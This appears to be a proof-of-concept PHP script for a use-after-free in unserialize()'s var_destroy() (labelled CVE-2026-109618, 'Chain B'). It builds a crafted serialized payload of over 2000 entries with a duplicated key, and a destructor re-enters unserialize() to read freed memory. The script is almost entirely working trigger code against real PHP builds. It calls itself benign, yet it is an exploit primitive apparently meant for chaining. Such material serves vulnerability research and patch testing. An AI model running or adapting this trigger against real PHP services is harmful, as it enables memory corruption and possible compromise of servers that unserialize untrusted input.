<?php
/*
 * Chain B (CVE-2026-109618) — var_destroy() reentrancy UAF trigger.
 *
 * Mechanism, as documented in the advisory analysis:
 *
 *   1. A payload with more than VAR_ENTRIES_MAX (1024 in PHP 5.4) entries
 *      makes the unserialize var_hash spill into extension chunks.
 *   2. A duplicated key moves the object value onto the deferred-destruction
 *      list (var_hash->first_dtor).
 *   3. var_destroy() frees the whole extension-chunk chain first, and only
 *      then walks first_dtor calling zval_ptr_dtor().
 *   4. That destructor runs WITHOUT BG(serialize_lock) being held, so it can
 *      re-enter unserialize(). The inner 'R:1500;' back-reference resolves
 *      against the outer var_hash whose chunks were just freed.
 *
 * Step 4 is a read of freed memory. On a normal build it is silent; under
 * AddressSanitizer it is reported as heap-use-after-free.
 *
 * Run with: USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=0 php trigger_uaf.php
 *
 * Benign: the destructor only calls gettype(); nothing is executed.
 */

class TriggerUAF {
    public function __destruct() {
        fwrite(STDERR, "[*] __destruct fired (reentering unserialize)\n");
        $result = @unserialize('R:1500;');
        fwrite(STDERR, "[*] R:1500 resolved to: " . gettype($result) . "\n");
    }
}

$N = 2000; // must exceed VAR_ENTRIES_MAX (1024) to create extension chunks

$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $payload .= "i:$i;i:$i;";
}
$payload .= 'i:99999;O:10:"TriggerUAF":0:{}'; // object value
$payload .= 'i:99999;i:42;';                  // duplicate key -> deferred dtor
$payload .= '}';

fwrite(STDERR, "[*] payload: " . strlen($payload) . " bytes, $N entries\n");
fwrite(STDERR, "[*] firing unserialize()...\n");

@unserialize($payload);

fwrite(STDERR, "[*] done\n");
